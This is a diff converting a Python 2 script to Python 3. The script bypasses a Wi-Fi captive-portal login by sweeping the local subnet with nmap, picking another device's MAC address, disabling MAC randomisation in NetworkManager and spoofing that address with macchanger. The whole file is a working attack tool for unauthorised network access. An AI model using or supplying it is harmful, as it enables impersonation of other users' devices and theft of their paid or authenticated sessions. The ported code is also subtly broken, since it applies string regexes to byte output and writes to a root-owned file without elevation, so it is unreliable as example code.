@@ -1,49 +1,42 @@
-import subprocess,re,time
+import subprocess, re, time
 
 def main():
-
-    i=raw_input("Enter wifi interface: ")
-    p = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
-    data=p.communicate()[0]
+    i = input("Enter wifi interface: ")
+    p = subprocess.run(["ifconfig"], stdout=subprocess.PIPE)
+    data = p.stdout
     try:
-        m = re.findall ( i+':(.*?)inet (.*?) netmask', data, re.DOTALL)[0][1].split()[0]
+        m = re.findall(i + ':(.*?)inet (.*?) netmask', data, re.DOTALL)[0][1].split()[0]
     except Exception as e:
-        print e
+        print(e)
 
-    p = subprocess.Popen(["nmap","-sP",m+"/24"], stdout=subprocess.PIPE)
-    data=p.communicate()[0]
+    p = subprocess.run(["nmap", "-sP", m + "/24"], stdout=subprocess.PIPE)
+    data = p.stdout
     try:
-        m = re.findall ( 'MAC Address: (.*?) ', data, re.DOTALL)
+        m = re.findall('MAC Address: (.*?) ', data, re.DOTALL)
     except Exception as e:
-        print e
+        print(e)
 
-    mac=m[int(len(m)/2)+1]
+    mac = m[int(len(m) / 2) + 1]
 
-    p = subprocess.Popen(["sudo","cat","/etc/NetworkManager/NetworkManager.conf"], stdout=subprocess.PIPE)
-    data=p.communicate()[0]
-    
+    p = subprocess.run(["sudo", "cat", "/etc/NetworkManager/NetworkManager.conf"], stdout=subprocess.PIPE)
+    data = p.stdout
 
     try:
-        m = re.findall ( 'wifi.scan-rand-mac-address=no', data, re.DOTALL)
+        m = re.findall('wifi.scan-rand-mac-address=no', data, re.DOTALL)
     except Exception as e:
-        print e
-
+        print(e)
 
     if not len(m):
-        print 1
-        f=open('/etc/NetworkManager/NetworkManager.conf','a')
-        f.write("\n\n[device]\nwifi.scan-rand-mac-address=no")
-        f.close() 
-        subprocess.Popen(["sudo","service","network-manager","restart"], stdout=subprocess.PIPE)
+        print(1)
+        with open('/etc/NetworkManager/NetworkManager.conf', 'a') as f:
+            f.write("\n\n[device]\nwifi.scan-rand-mac-address=no")
+        subprocess.run(["sudo", "service", "network-manager", "restart"])
 
-
-    p=subprocess.Popen(["sudo","ifconfig",i,"down"], stdout=subprocess.PIPE)
-    print 1
-    p=subprocess.Popen(["sudo","macchanger","--mac",mac,i], stdout=subprocess.PIPE)
-    p=subprocess.Popen(["sudo","ifconfig",i,"up"], stdout=subprocess.PIPE)
-    p=subprocess.Popen(["sudo","service","network-manager","restart"], stdout=subprocess.PIPE)
-    data=p.communicate()
-    print "Wifi Login Bypassed!"
+    p = subprocess.run(["sudo", "ifconfig", i, "down"])
+    print(1)
+    p = subprocess.run(["sudo", "macchanger", "--mac", mac, i])
+    p = subprocess.run(["sudo", "ifconfig", i, "up"])
+    p = subprocess.run(["sudo", "service", "network-manager", "restart"])
+    print("Wifi Login Bypassed!")
 
 main()
-
